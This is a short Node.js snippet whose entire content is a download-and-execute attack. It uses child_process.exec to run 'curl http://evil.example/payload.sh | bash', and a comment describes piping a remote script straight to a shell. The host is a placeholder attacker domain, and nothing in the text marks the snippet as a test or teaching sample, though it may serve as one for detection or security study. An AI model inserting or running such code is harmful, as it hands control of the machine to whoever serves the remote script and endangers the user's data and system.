const { exec } = require("child_process");
// Download-and-execute: pull a remote script and pipe it straight to a shell.
exec("curl http://evil.example/payload.sh | bash");
